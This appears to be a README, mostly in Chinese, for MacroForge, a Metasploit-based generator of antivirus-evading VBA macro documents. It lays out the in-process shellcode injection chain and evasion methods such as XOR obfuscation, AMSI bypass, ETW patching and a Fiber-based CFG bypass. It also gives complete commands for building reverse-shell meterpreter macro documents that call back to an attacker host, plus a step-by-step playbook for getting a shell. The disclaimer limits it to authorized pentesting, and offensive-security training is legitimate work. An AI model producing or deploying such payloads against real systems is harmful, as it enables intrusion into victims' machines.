# MacroForge v3.0

基于 Metasploit 的免杀 VBA 宏 Payload 自动生成器，面向 OSEP / 授权渗透测试。一条命令生成自包含 Office 宏文档，支持**进程内 shellcode 注入**（无需 PowerShell）和**3-stage PS1 后备**两种模式。

An AV-evasive VBA macro payload generator built on Metasploit for OSEP and authorized pentesting.

---

## 功能概览

### 双模式

| 模式 | 原理 | 适用场景 |
|------|------|---------|
| `shellcode`（默认） | VBA 在 WINWORD.exe 内直接分配内存并执行 shellcode | Defender 标准配置、Office 32-bit 或 64-bit |
| `staged` | PowerShell 3-stage 远程加载，WMI 断链 | ASR 规则拦截 Win32 API、需要绕 CLM/AppLocker |

**shellcode 模式** 是高权限场景首选，全程无 `powershell.exe` 子进程，不经过 AMSI for PowerShell、AppLocker 脚本策略、CLM 和 ScriptBlock 日志。执行链路为：

```
AutoOpen() → 拼接 hex shellcode → XOR 解密 → VirtualAlloc(RW)
→ RtlMoveMemory 写入 → 清零源缓冲 → Sleep 250ms 打断时序
→ VirtualProtect(RX) → callback API / fiber 触发执行
```

**staged 模式** 用于 Office ASR 开启 "Block Win32 API calls from Office macros" 的环境，改用 WMI 分层加载。

### 反检测

- **全随机标识符** — 函数/变量/Declare 别名/类名/文件名每次不同
- **shellcode XOR 加密 + 分块** — 逐字节 XOR，拆到多个 VBA Function（规避 64KB 编译上限）
- **RW→RX 两阶段内存** — 分配 `PAGE_READWRITE`，写入后再 `VirtualProtect` 翻 `PAGE_EXECUTE_READ`，避免 RWX 可直接执行的启发式签名
- **多种 callback 执行** — `EnumWindows` / `CertEnumSystemStore` / `EnumDateFormatsW` / `Fiber`（Fiber 绕过 Control Flow Guard）
- **msfvenom 编码器** — `x64/xor_dynamic` 等打散 meterpreter stub 字节签名

### 调试与诊断

- **`--debug` beacon 系统** — 代码关键节点注入 HTTP GET，在攻击端实时看到执行进度
- **`--test` 诊断模式** — 无需真正 meterpreter，快速隔离问题：
  - `calc` / `msgbox` — 验证 shellcode 是否执行
  - `http` — 验证 WINWORD.exe 是否具备网络出站能力
  - `bits` — 绕过 Office 进程内 API hook，用 BITS 服务出站

### 其他

- **Stageless** — 一次嵌入完整 meterpreter（~200KB），避免 stage 下载被拦截
- **端口冲突自动检测** — `--lport` 与 `--http-port` 冲突时自动规避
- **一键运行** — `--serve --listen` 自动启动 HTTP server + msfconsole

---

## 环境要求

- Python 3.6+
- Metasploit Framework（脚本自动检测 Kali `/usr/share/metasploit-framework` 及 Windows 常见路径）
- Kali Linux 或 Windows（生成端）

---

## 快速开始

```bash
# 最常见用法：x86 + reverse_http + beacon + 一键监听
python MacroForge.py --lhost 192.168.45.239 --arch x86 --payload reverse_http --lport 8080 \
    --http-port 9999 --debug --serve --listen

# 传统 staged 模式
python MacroForge.py --lhost 192.168.45.239 --mode staged --method xor --serve --listen

# 诊断 shellcode 是否真执行（不拉 meterpreter）
python MacroForge.py --lhost 192.168.45.239 --test http --debug --serve
```

---

## 实战流程：按顺序试，拿到 shell 为止

> 把 `<LHOST>` 换成你的 IP。每条命令跑完 → `macro.vba` 粘进 Word 做 `.docm` → 上传到入口 → 盯 beacon 日志。成功就停，失败跑下一条。全都不行换工具。

### ① x86 + HTTP（首发，覆盖 80% 场景）

```bash
python MacroForge.py --lhost <LHOST> --arch x86 --payload reverse_http \
    --lport 8080 --http-port 9999 --debug --serve --listen
```

### ② 换 x64（Office 是 64-bit）

```bash
python MacroForge.py --lhost <LHOST> --arch x64 --payload reverse_http \
    --lport 8080 --http-port 9999 --debug --serve --listen
```

### ③ 换 stageless（stage 下载被拦 / 内网代理复杂）

```bash
python MacroForge.py --lhost <LHOST> --arch x86 --payload stageless_http \
    --lport 8080 --http-port 9999 --debug --serve --listen

# x64 版本:
python MacroForge.py --lhost <LHOST> --arch x64 --payload stageless_http \
    --lport 8080 --http-port 9999 --debug --serve --listen
```

### ④ Fiber（invoke_* 出现了但 session 没上来 = CFG 拦了 callback）

```bash
python MacroForge.py --lhost <LHOST> --arch x86 --payload reverse_http \
    --callback fiber --lport 8080 --http-port 9999 --debug --serve --listen
```

### ⑤ 换出口端口（80/443/53/8443）

```bash
# HTTPS 走 443:
python MacroForge.py --lhost <LHOST> --arch x86 --payload reverse_https --lport 443 --debug --serve --listen

# TCP 走 53:
python MacroForge.py --lhost <LHOST> --arch x86 --payload reverse_tcp --lport 53 --debug --serve --listen
```

### ⑥ PS1 staged 回退（ASR 拦了 Win32 API）

```bash
python MacroForge.py --lhost <LHOST> --mode staged --method xor \
    --lport 8080 --http-port 9999 --debug --serve --listen
```

### ⑦ 诊断：shellcode 到底跑没跑

```bash
python MacroForge.py --lhost <LHOST> --arch x86 --test http \
    --callback enumwindows --http-port 9999 --debug --serve
```

beacon 如果出现 `[BEACON-SC] alive` = shellcode 能跑能出网，问题在 meterpreter 协议层。没出现 = shellcode 本身没执行。

---

### 看到 beacon 怎么判断

| 最后 beacon | 意思 | 下一步 |
|-------------|------|--------|
| 无任何 beacon | 文档没被打开 | 等，确认上传了新 .docm |
| `invoke_*` + session | **成功** | 收工 |
| `invoke_*` 但无 session | CFG 或端口 | 跳到第 ④ 或第 ⑤ 条 |
| `alloc_rw_0` | VirtualAlloc 被拦 | 跳到第 ⑥ 条（ASR） |

### 记住

- **x86 优先**：绝大多数企业 Office 是 32-bit，x64 shellcode 在 32-bit 进程里直接 crash
- **beacon 端口 ≠ handler 端口**：`--http-port` 和 `--lport` 不能一样
- **等**：sandbox 有时 10 分钟才打开文档，别急着切命令

---

## 完整参数表

```
python MacroForge.py --lhost <IP> [options]

必填:
  --lhost <IP>            监听 IP 地址

执行模式:
  --mode <mode>           shellcode (默认) | staged
  --callback <api>        enumwindows | certenumsystemstore | enumdateformatsw | fiber | random (默认)
  --test <type>           诊断模式: calc | msgbox | http | bits (覆盖 --payload)

载荷:
  --payload <payload>     reverse_tcp (默认) | reverse_http | reverse_https | shell_tcp
                          | stageless_tcp | stageless_http | stageless_https
  --arch <arch>           x86 | x64 (默认 x64，实际建议优先试 x86)
  --lport <port>          监听端口 (默认 4444)
  --encoder <enc>         msfvenom 编码器，如 x64/xor_dynamic (默认无)
  --iterations <n>        编码迭代次数 (默认 1)

VBA 字符串加密 (仅 staged 模式):
  --method <method>       caesar | xor | base64 | charcode | random (默认)
  --shift <key>           加密密钥 (默认自动)

网络与服务:
  --http-port <port>      HTTP 服务端口 (默认 8080)
  --serve [PORT]          自动启动 HTTP 服务
  --listen                自动启动 msfconsole handler

调试:
  --debug                 注入 HTTP beacon 埋点

其他:
  --msf-path <path>       Metasploit 路径 (默认自动检测)
  --output-dir <dir>      输出目录 (默认当前)
```

---

## 输出文件

### shellcode 模式

| 文件 | 说明 |
|------|------|
| `macro.vba` | 自包含 VBA 注入代码（含 XOR 加密 shellcode + 分块函数 + Declare + callback/fiber 调用） |
| `handler.rc` | msfconsole 资源文件 |

### staged 模式

| 文件 | 说明 |
|------|------|
| `macro.vba` | 混淆后的 VBA 下载器 |
| `<random>.ps1` | Stage 1 — 落盘到目标 `%TEMP%`，运行时 AMSI bypass |
| `<random>.txt` | Stage 2 — HTTP 分发，纯内存 IEX（Add-Type + ETW patch） |
| `<random>.txt` | Stage 3 — HTTP 分发，纯内存 IEX（XOR 解密 shellcode + 注入） |
| `handler.rc` | msfconsole 资源文件 |

---

## 免杀层次

| 层级 | shellcode 模式 | staged 模式 |
|------|----------------|-------------|
| 进程链 | 无子进程，全在 WINWORD.exe | WMI 断链 (Word → WMI → PowerShell) |
| 文档层 | XOR 加密 + hex 分块嵌入 | 仅含混淆下载器（无 shellcode 字面量） |
| 字符串 | 无明文敏感字符串 | 4 种加密方法随机选择 |
| 标识符 | 每次全随机 | 同左 |
| 内存 | RW→RX 两阶段 + 清零 + Sleep 打断时序 | 由 PS1 层处理 |
| 触发 | 多 API 轮换 / Fiber CFG bypass | CreateThread |
| AMSI | 不涉及（VBA 不走 AMSI for PS） | 运行时构建 marker 字面量 |
| ETW | 不涉及 | ntdll!EtwEventWrite patch (ret) |
| 载荷 | 逐字节 XOR + 可选 msfvenom encoder | XOR 加密 shellcode |

---

## 免责声明

本工具仅用于授权渗透测试、安全教育和合法研究（如 OSEP/OSCP 认证考试）。未经授权对非自有系统使用属于违法行为，使用者承担全部法律责任。

This tool is for authorized penetration testing, security education, and legitimate research only.
